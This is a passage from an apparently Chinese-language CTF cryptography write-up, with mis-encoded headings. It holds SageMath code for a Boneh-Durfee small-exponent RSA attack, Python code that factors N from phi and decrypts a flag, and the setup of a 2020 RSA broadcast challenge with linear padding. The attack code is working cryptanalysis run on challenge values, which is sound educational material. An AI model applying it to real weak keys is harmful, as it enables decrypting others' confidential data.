class="hljs-number">1</span><br><br>    <span class="hljs-comment"># x-shifts</span><br>    gg = []<br>    <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mm + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mm - kk + <span class="hljs-number">1</span>):<br>            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk<br>            gg.append(xshift)<br>    gg.sort()<br><br>    <span class="hljs-comment"># x-shifts list of monomials</span><br>    monomials = []<br>    <span class="hljs-keyword">for</span> polynomial <span class="hljs-keyword">in</span> gg:<br>        <span class="hljs-keyword">for</span> monomial <span class="hljs-keyword">in</span> polynomial.monomials():<br>            <span class="hljs-keyword">if</span> monomial <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> monomials:<br>                monomials.append(monomial)<br>    monomials.sort()<br>    <br>    <span class="hljs-comment"># y-shifts (selected by Herrman and May)</span><br>    <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, tt + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mm//tt * jj, mm + <span class="hljs-number">1</span>):<br>            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)<br>            yshift = Q(yshift).lift()<br>            gg.append(yshift) <span class="hljs-comment"># substitution</span><br>    <br>    <span class="hljs-comment"># y-shifts list of monomials</span><br>    <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, tt + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mm//tt * jj, mm + <span class="hljs-number">1</span>):<br>            monomials.append(u^kk * y^jj)<br><br>    <span class="hljs-comment"># construct lattice B</span><br>    nn = <span class="hljs-built_in">len</span>(monomials)<br>    BB = Matrix(ZZ, nn)<br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn):<br>        BB[ii, <span class="hljs-number">0</span>] = gg[ii](<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, ii + <span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> monomials[jj] <span class="hljs-keyword">in</span> gg[ii].monomials():<br>                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)<br><br>    <span class="hljs-comment"># Prototype to reduce the lattice</span><br>    <span class="hljs-keyword">if</span> helpful_only:<br>        <span class="hljs-comment"># automatically remove</span><br>        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># reset dimension</span><br>        nn = BB.dimensions()[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">if</span> nn == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;failure&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># check if vectors are helpful</span><br>    <span class="hljs-keyword">if</span> debug:<br>        helpful_vectors(BB, modulus^mm)<br>    <br>    <span class="hljs-comment"># check if determinant is correctly bounded</span><br>    det = BB.det()<br>    bound = modulus^(mm*nn)<br>    <span class="hljs-keyword">if</span> det &gt;= bound:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Try with highers m and t.&quot;</span>)<br>        <span class="hljs-keyword">if</span> debug:<br>            diff = (log(det) - log(bound)) / log(<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">if</span> strict:<br>            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)<br><br>    <span class="hljs-comment"># display the lattice basis</span><br>    <span class="hljs-keyword">if</span> debug:<br>        matrix_overview(BB, modulus^mm)<br><br>    <span class="hljs-comment"># LLL</span><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)<br><br>    BB = BB.LLL()<br><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LLL is done!&quot;</span>)<br><br>    <span class="hljs-comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;looking for independent vectors in the lattice&quot;</span>)<br>    found_polynomials = <span class="hljs-literal">False</span><br>    <br>    <span class="hljs-keyword">for</span> pol1_idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn - <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> pol2_idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(pol1_idx + <span class="hljs-number">1</span>, nn):<br>            <span class="hljs-comment"># for i and j, create the two polynomials</span><br>            PR.&lt;w,z&gt; = PolynomialRing(ZZ)<br>            pol1 = pol2 = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn):<br>                pol1 += monomials[jj](w*z+<span class="hljs-number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)<br>                pol2 += monomials[jj](w*z+<span class="hljs-number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)<br><br>            <span class="hljs-comment"># resultant</span><br>            PR.&lt;q&gt; = PolynomialRing(ZZ)<br>            rr = pol1.resultant(pol2)<br><br>            <span class="hljs-comment"># are these good polynomials?</span><br>            <span class="hljs-keyword">if</span> rr.is_zero() <span class="hljs-keyword">or</span> rr.monomials() == [<span class="hljs-number">1</span>]:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="hljs-string">&quot;and&quot;</span>, pol2_idx)<br>                found_polynomials = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> found_polynomials:<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found_polynomials:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>    <br>    rr = rr(q, q)<br><br>    <span class="hljs-comment"># solutions</span><br>    soly = rr.roots()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(soly) == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Your prediction (delta) is too small&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br><br>    soly = soly[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br>    ss = pol1(q, soly)<br>    solx = ss.roots()[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-keyword">return</span> solx, soly<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">N, e, factor_bit_length, factors, delta=<span class="hljs-number">0.25</span>, m=<span class="hljs-number">1</span></span>):<br>    x, y = ZZ[<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;y&quot;</span>].gens()<br>    A = N + <span class="hljs-number">1</span><br>    f = x * (A + y) + <span class="hljs-number">1</span><br>    X = <span class="hljs-built_in">int</span>(RR(e) ** delta)<br>    Y = <span class="hljs-built_in">int</span>(N^((factors-<span class="hljs-number">1</span>)/factors))<br>    t = <span class="hljs-built_in">int</span>((<span class="hljs-number">1</span> - <span class="hljs-number">2</span> * delta) * m)<br>    x0, y0 = boneh_durfee(f, e, m, t, X, Y)<br>    z = <span class="hljs-built_in">int</span>(f(x0, y0))<br>    <span class="hljs-keyword">if</span> z % e == <span class="hljs-number">0</span>:<br>        phi = N +<span class="hljs-built_in">int</span>(y0) + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> phi<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br>n = <span class="hljs-number">11807668285253476335993112649125478311738138284032009521013160232275155591439056104050712447640428132619606976587476242139778581733169915977009541156271158342164308850183882293808973497182420010031579067660977663894542027297739371427053469215030263817360875451422844176774669484378609912250701562139454836788798283646984193408478412076837926365908454580066517380897820350918189254782926664771936070107395821284187885892036352109035393564580351743381904585469190706683218284347728580797326563996730184944085618477815023279614804702457729169640438408479963581615968900059881783129713048355206267321472950141238916990289</span><br>e = <span class="hljs-number">5281486869323390978888423235641733430226678655686523392509714694751699050972120246916705000659875362083798615103093121939019773338011435050637066804667485505484551148317473841662442079996914658971301530910391768225029937660420184269526291001532582856000498690281601708552422507554114650938378386138884675333079129219306840932269967053765809850586002685750596186872500960539502358573116582308035530522367769717985694159855985288721479249298872468268929957454831663164937357314947859985362524031645431354657428639172589105754006273997415340441064909574647647141996659760272695449996972251425797398960494913207372272501</span><br><span class="hljs-built_in">print</span>(attack(n, e, <span class="hljs-number">512</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0.270</span>,<span class="hljs-number">10</span>))<br><span class="hljs-comment">#11807668285253476335993112649125478311738138284032009521013160232275155591439056104050712447640428132619606976587476242139778581733169915977009541156271158342164308850183882293808973497182420010031579067660977663894542027297739371427053469215030263817360875451422844176774669484378609912250701562139454836788580954283961789345480162099667001543891543639039785702888420923141077344358421051350061532584618771565302075962527648516570054467566143564854760959148274897390714017585220094430947903853829077089810614861107089070658414503772365171320735613805448738756377532942888788137666255740398790486415370724509249593956</span><br></code></pre></td></tr></table></figure><h4 id="72-çŸ¥é“phinå’Œnè¿›è¡Œåˆ†è§£"><a class="markdownIt-Anchor" href="#72-çŸ¥é“phinå’Œnè¿›è¡Œåˆ†è§£"></a> 7.2 çŸ¥é“phinå’Œnè¿›è¡Œåˆ†è§£</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs pyhton">from random import randrange<br>from gmpy2 import gcd<br>from Crypto.Util.number import isPrime<br>from Crypto.Cipher import AES<br>import hashlib<br>def factorize_multi_prime(N, phi):<br>    prime_factors = set()<br>    factors = [N]<br>    while len(factors) &gt; 0:<br>        # Element to factorize.<br>        N = factors[0]<br><br>        w = randrange(2, N - 1)<br>        i = 1<br>        while phi % (2**i) == 0:<br>            sqrt_1 = pow(w, phi // (2**i), N)<br>            if sqrt_1 &gt; 1 and sqrt_1 != N - 1:<br>                # We can remove the element to factorize now, because we have a factorization.<br>                factors = factors[1:]<br><br>                p = gcd(N, sqrt_1 + 1)<br>                q = N // p<br><br>                if isPrime(p):<br>                    prime_factors.add(p)<br>                elif p &gt; 1:<br>                    factors.append(p)<br><br>                if isPrime(q):<br>                    prime_factors.add(q)<br>                elif q &gt; 1:<br>                    factors.append(q)<br><br>                # Continue in the outer loop<br>                break<br><br>            i += 1<br><br>    return list(prime_factors)<br>n= 11807668285253476335993112649125478311738138284032009521013160232275155591439056104050712447640428132619606976587476242139778581733169915977009541156271158342164308850183882293808973497182420010031579067660977663894542027297739371427053469215030263817360875451422844176774669484378609912250701562139454836788798283646984193408478412076837926365908454580066517380897820350918189254782926664771936070107395821284187885892036352109035393564580351743381904585469190706683218284347728580797326563996730184944085618477815023279614804702457729169640438408479963581615968900059881783129713048355206267321472950141238916990289<br>phi= 11807668285253476335993112649125478311738138284032009521013160232275155591439056104050712447640428132619606976587476242139778581733169915977009541156271158342164308850183882293808973497182420010031579067660977663894542027297739371427053469215030263817360875451422844176774669484378609912250701562139454836788580954283961789345480162099667001543891543639039785702888420923141077344358421051350061532584618771565302075962527648516570054467566143564854760959148274897390714017585220094430947903853829077089810614861107089070658414503772365171320735613805448738756377532942888788137666255740398790486415370724509249593956<br>     <br>print(factorize_multi_prime(n,phi))<br>p=109251812397373321369840755208338684181849016249638331267293943483115497998725084726738929391662966344551120589566300806536096548160787172237706693859608475141219078669813672240834436097740939389436503141021125884696328239129598176499232703067484613497368721713418450511690584287062214763737382684815118290807<br>q=108077550625030741628409221962586137835061924777093346742105484293996412425780528695135608131114083374334689339942402785929242548853421006289436932461307334151285188092694814125544224045160168464838500475686808324260061959555765821820470091607030229362222645403574544480356208327745262071320196731914549105527<br>c=7320983754394577422767542259069116006114676957581611253208089569490712064263822719681906219830045070027417890563005314255698660920759511532031914399521431010299257046526287119522646336307583924582732194043891855691431909500109014302908312283511965320377811140085483883126526462467293815637138718444001931483069474449989528839243687527037766658696775697609190493251942630904142633135051494201917324487853767845670807311896759009183844195818162749380637909781931403232226599915889508138332312516115335987268671038564169230604383642551512237979390401177728387916170497777974947392809240193434636218076335466512033333461<br>e=5281486869323390978888423235641733430226678655686523392509714694751699050972120246916705000659875362083798615103093121939019773338011435050637066804667485505484551148317473841662442079996914658971301530910391768225029937660420184269526291001532582856000498690281601708552422507554114650938378386138884675333079129219306840932269967053765809850586002685750596186872500960539502358573116582308035530522367769717985694159855985288721479249298872468268929957454831663164937357314947859985362524031645431354657428639172589105754006273997415340441064909574647647141996659760272695449996972251425797398960494913207372272501<br>d=invert(e,(p-1)*(q-1))<br>print(long_to_bytes(pow(c,d,p*q)).hex())<br></code></pre></td></tr></table></figure><h1 id="ç¾ŠåŸæ¯-2020invitations"><a class="markdownIt-Anchor" href="#ç¾ŠåŸæ¯-2020invitations"></a> [ç¾ŠåŸæ¯ 2020]INVITATIONS</h1><h2 id="é¢˜ç›®-19"><a class="markdownIt-Anchor" href="#é¢˜ç›®-19"></a> é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, bytes_to_long<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> random<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">s,i</span>):<br>    <span class="hljs-keyword">return</span> i * <span class="hljs-built_in">pow</span>(<span class="hljs-number">3</span>,s.bit_length()) + s**<span class="hljs-number">2</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_N</span>():<br>    <span class="hljs-keyword">return</span> getPrime(<span class="hljs-number">512</span>) * getPrime(<span class="hljs-number">512</span>)<br><br><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag) == <span class="hljs-number">54</span><br>invite = bytes_to_long(flag)<br><br>e_list = [random.choice([<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">7</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>)]<br>N_list = [gen_N() <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>)]<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./invitations&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>):<br>        invis = <span class="hljs-built_in">pow</span>(pad(invite,i+<span class="hljs-number">1</span>),e_list[i],N_list[i])<br>        f.write(<span class="hljs-string">&#x27;Invitation%d: %d \n&#x27;</span>%(i+<span class="hljs-number">1</span>,invis))<br><br>    f.write(<span class="hljs-string">&#x27;Wait a minute! \n&#x27;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>):<br>        f.write(<span class="hljs-string">&#x27;[e%d,N%d]: [%d,%d]\n&#x27;</span>%(i+<span class="hljs-number">1</span>,i+<span class="hljs-number">1</span>,e_list[i],N_list[i]))<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Invitation1: 2726880165485794753015221799903015469859604350960070462389832770775190258204902795671085685627736110579803076064313238826997962227132535666379117171603278182417820587346210511971127809627876548907651538393737303011542136469304569045407566630840981287558726831003180186144633381044057099863505591978316576331 </span><br><span class="hljs-string">Invitation2: 52844103418322232725177561034428083147725292376614668718220523666259095447694889972949103379829470432332480992707892007073319952276490981511612735696207090391646476749895265951654074573797235607971038590694835782189124391368712277613425337912212240432011011071881837734857743183367019103096901117395938690572 </span><br><span class="hljs-string">Invitation3: 129274519334082165644106292383763271862424981496822335330342328217347928093592453953990448827969549377883054831490973006383371688359344675312001881631556371220779971357039899721241880304156884612458373310254854821837978876725801047977081900824202659636258168216028784656056334358157381820784576207338479493823 </span><br><span class="hljs-string">Invitation4: 56852637683122735164568970875066131746509133403072354742812890131597805562226047560392266004050592533316793038372256396537829143627478792510526346644756590135871716813976819138793368813440386409129373327577756689416990858633825538766694242123021009535005392002648416127869437948525458000795891155650312894218 </span><br><span class="hljs-string">Invitation5: 24933581882539143383805596779774030477763512752520375486982562296903063067503747125713029403793101373585417342942950790457235350083784905974251188305010098928244056980941419687746319300184530161551239060873604405554973757867815783641391659818219177575212360602858057667033472530286856616676363511656764861866 </span><br><span class="hljs-string">Invitation6: 7491476722927235473944826192371870577426352529433316210668760004930228302472920679959949471665143237333356259221787618020560963460668303766902416340056446225333025453011937952801159044781738493694911250765543392959285625650198325627539546777165439291150376527665779894748453633305704694635029402487576286720 </span><br><span class="hljs-string">Invitation7: 46994515206702516116723205176259615067102717099690856936455392000070823814544052445278146449282379251128163008476565339875497253781717590664182753552262233895322322657625202522815172174432182181682631558679857615390973133346476079858014623412440411395083299226947371458955797627789607079672039131280242758091 </span><br><span class="hljs-string">Invitation8: 8140023566779187828652447593867705813386781164538611122714708931585587727699213769519135028841126072130625547328311301696554048174772606261707345115571968105138543476580875347239912760797035694220505996377127309341770427102697008350472060971360460756799310951343070384766137332401117333917901167639276168214 </span><br><span class="hljs-string">Invitation9: 8385766476371753553977800353128766303065572190592509929058486984964439147256960481698015327599879810752997804957814193113184978479627127131318723231581432235920975812354556190022727375961505764199831794239507708621401077801662954349957627630157786326057704380977697746043041515978455150985893713987598581167 </span><br><span class="hljs-string">Invitation10: 25434511525127530194830986592289179576070740435049947678930286998924519588985583799757299734846614343604661534391991096353170465467791358514448923161460366596251448937540153262731348684727026598527904328268639060306102090278287818149679940661579357649191023269947102746200467430583428889484549034314463114080 </span><br><span class="hljs-string">Invitation11: 9435583236354598287661880148272717764447540972316605192855157484524753847806158586224733743434644389385148450722945845355791145016665856388503878165725148745517696840251674049929524448078129458846254866804153080766917319923905682824180976106679633180818527967145571143203594244851742143986040226240019541346 </span><br><span class="hljs-string">Invitation12: 42653412322252936189967169320174001935456500265020295381235749570735595316912049949245536609634786767873783560657460914097412643705264107040560389003526999720357122717443215007182355846769697457076620951388839672721527406861414375682603373503445636748304326212654026233985520038237509837611802457243967916967 </span><br><span class="hljs-string">Invitation13: 50163996128508874413636370533324079468893191391677157815578286348174669089976633631417431754505804284298354381223186985949160012660340790440711469708712479223582014168361667639570586425626182863344576254691662799762136734638820942002509860333817967414572002225418810272184173820322912928927789061077468994953 </span><br><span class="hljs-string">Invitation14: 55181712049788569218094734913693030675622116883683701002270524678292896232044695586872582672159854063365203462010143885417632291300773699604618481578372258936513301821561273604986211363808846581429372811764533701610119228124866223770584249909429743735157839245622925997548481946831963456454939343358587988983 </span><br><span class="hljs-string">Wait a minute! </span><br><span class="hljs-string">[e1,N1]: [5,90361246179367799606636863352077187566064794796456461177972505143929614628873639223638940051613378291778175724735519020067052934403115774679961661481160141872257338930620863078688082915958381094674423803586734810828570206667419458295735288184697613296663226516640069281835035704453280781694226293902395215269]</span><br><span class="hljs-string">[e2,N2]: [5,83202136479583179143205059354864808364257451670037867814548678142629716115373207061455185843132942837300718212806534861585785041547496145915392175827479376792813058845422044909477892978293495048968520853100992244672416436363272286740068846609018921112995562647093952700070707124842514243806528982910520604851]</span><br><span class="hljs-string">[e3,N3]: [3,146694460234280339612721415368435987068740712812770728817136582256341063038147863645902264969297892447333024201649306207442798919845916187823646745721109151386096190207317810424580842120750075213595282979568495342617919336417068886973047979116994072272482630372638964064972815256237040541007947708358680368391]</span><br><span class="hljs-string">[e4,N4]: [7,145212137982314671207105886550619275956842416412937060552686822638155412950680057688522218990023473104787006548449644240065948769143660097622695125682017688804838701293738298008178105057147539522368965730223561911750657089352591376219016726977232279206451303896573325330139830440927228125810665303608828462177]</span><br><span class="hljs-string">[e5,N5]: [5,69335368232766044823545542187513771534967902179150417021053554241638095909666122935053210964003511014870892979205875153115719406287728162111662254890513324436473313860142126335197489227724691042286796058111753972895113145188906829975189506125997319609609974126645475084944238417929532560409919420929255247813]</span><br><span class="hljs-string">[e6,N6]: [5,93889543065608951579836429313520485233295158467296710329997599807630401722519056218864031741675898621375735347229494633577571323057785261271373295860331130588582231771193563731092603614818963592931492474988532068227153492022582339704874613690044001529412669510094771064646843676765163737757104643318364446839]</span><br><span class="hljs-string">[e7,N7]: [7,66174700839404221060785862467924299511645570336361033287335855493589093141782896451863402373425798838446538369142584932156150350565382116869446083154097803842190010954019565857767923584979615770650706675094209251111816761431713779074557571353022624477001770694207393369796369620048999514683357963227119554487]</span><br><span class="hljs-string">[e8,N8]: [3,65031485534704406281490718325237831433086480239135617407356760819741796565231283220528137697949585150709734732370203390254643835828984376427852793969716489016520923272675090536677771074867975287284694860155903327351119710765174437247599498342292671117884858621418276613385329637307269711179183430246951756029]</span><br><span class="hljs-string">[e9,N9]: [5,72454311940971803130612024751128556938725737742029062979349607787083978826668706819793864356790325653817555839762732164812521831864626411495002267399139766907846534945632792910468487287154661692733986224962564621615361536373173705359255153606552352581704159462310354407361311378558150604159961029937052901709]</span><br><span class="hljs-string">[e10,N10]: [3,126172075578367446151297289668746433680600889845504078949758568698284471307000358407453139846282095477016675769468273204536898117467559575203458221600341760844973676129445394999861380625435418853474246813202182316736885441120197888145039130477114127079444939102267586634051045795627433724810346460217871661901]</span><br><span class="hljs-string">[e11,N11]: [3,75691424835079457343374072990750986689075078863640186724151061449621926239051140991748483370587430224317778303489124525034113533087612981452189061743589227565099659070008017454957304620495920813121234552401715857719372861565651204968408267740732475458128601061676264465241188491988485848198323410127587280471]</span><br><span class="hljs-string">[e12,N12]: [7,88063052818271125442049408332053226451497067720511502513828848476569985821115735898897947439175727789641390104005400308936768495751619165683456550165811034670341697022370415202614387373196086237042577737857259724530596416810462125219296930758592032765843338961894697491961439584875235274163072466474940670589]</span><br><span class="hljs-string">[e13,N13]: [5,86478932133708863968749977073639049451666195461247968321317885106346907736572028122496476049748246757185316498949163898915427948597498506162230927380667345132742891001640364064647368394822175742973968167028656790729030556005407153405955458636780270673780720333871959638216946584461925553782697695137132507853]</span><br><span class="hljs-string">[e14,N14]: [7,137641493263428303662262187582231235637921833879366309318941383348412296182252654397496377642861646991438721153462001357875169325595544056465299787575422581289053630686684843044593163904089201855371863459503176022957832807726507152235818181000484878683030989944063049622694810207054366378176225221479695833371]</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-19"><a class="markdownIt-Anchor" href="#åˆ†æ-19"></a> åˆ†æ</h2><h3 id="åŠ å¯†è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#åŠ å¯†è¿‡ç¨‹"></a> åŠ å¯†è¿‡ç¨‹ï¼š</h3><p>ä»3,5,7ä¸­éšæœºé€‰æ‹©14æ¬¡ï¼Œå½“ä½œeï¼Œç„¶åæ­£å¸¸ç”Ÿæˆ14ä¸ªnã€‚</p><p>å¾ªç¯14æ¬¡ï¼Œæ¯æ¬¡å…ˆå¯¹mè¿›è¡Œpadï¼Œpadçš„å€¼è·Ÿiå’Œflagé•¿åº¦æœ‰å…³ã€‚è¿™é‡Œflagé•¿åº¦æ˜¯å›ºå®šå€¼ã€‚</p><p>æ ¹æ®flagå¤´â€œGWTH{â€ï¼ˆæ¯”èµ›æ—¶è‚¯å®šèƒ½çŸ¥é“ï¼‰ï¼Œflagé•¿åº¦ï¼Œè¿›è¡Œè®¡ç®—ã€‚</p><p>padçš„è¿‡ç¨‹å¯ä»¥å½“ä½œæ˜¯çº¿æ€§å¡«å……ï¼Œä¸è¿‡å¯¹mè¿›è¡Œäº†å¹³æ–¹ï¼Œè¿™ä¸å½±å“ã€‚</p><p>padä¹‹åå°±æ˜¯æ­£å¸¸çš„rsaåŠ å¯†ã€‚</p><h3 id="è§£å¯†è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#è§£å¯†è¿‡ç¨‹"></a> è§£å¯†è¿‡ç¨‹ï¼š</h3><p>æˆ‘æ‰¾äº†xennyå¸ˆå‚…çš„æ¨¡æ¿ï¼ˆå¯ä»¥ç›´æ¥pip install xennyï¼Œç„¶åå»site-packagesé‡Œé¢æ‰¾ï¼‰ï¼Œè¿˜æœ‰[RSA Coppersmithç›¸å…³æ”»å‡» | NonupleBroken](<a href="https://nonuplebroken.com/2019/11/21/RSA">https://nonuplebroken.com/2019/11/21/RSA</a> Coppersmithç›¸å…³æ”»å‡»/#broadcast-attack-with-linear-padding)è¿™é‡Œçš„æ¨¡æ¿ï¼Œæ²¡æœ‰ç†è§£åŸç†ï¼Œæˆ‘å°±ç›´æ¥ä¸Šç»“è®ºäº†ã€‚</p><p>è¿™é‡Œå…ˆæ”¾å‡ ç¯‡æ–‡ç« </p><blockquote><p>paper:<a href="https://crypto.stanford.edu/~dabo/pubs/papers/RSA-survey.pdf">RSA-survey.pdf (stanford.edu)</a></p><p><a href="https://github.com/ashutosh1206/Crypton/blob/master/RSA-encryption/Attack-Hastad-Broadcast/README.md">Crypton/RSA-encryption/Attack-Hastad-Broadcast/README.md at master Â· ashutosh1206/Crypton (github.com)</a></p></blockquote><p>å…ˆæ”¾ä¸€ä¸‹æ­¥éª¤</p><blockquote><p>Exploit in a Nutshell:</p><ol><li>Calculate N = n1<em>n2</em>â€¦</li><li>Calculate each element T[j] as per the above conditions using CRT</li><li>Assign P. = PolynomialRing(Zmod(N))</li><li>g[j] = (i*(2^m) + x)^e - c, where the message is padded using the above conditions</li><li>Assign g = Sum_of(T[j] * g[j])</li><li>Check if g is a monic polynomial, if not transform it into a monic polynomial</li><li>Find small roots of g and check if that is the 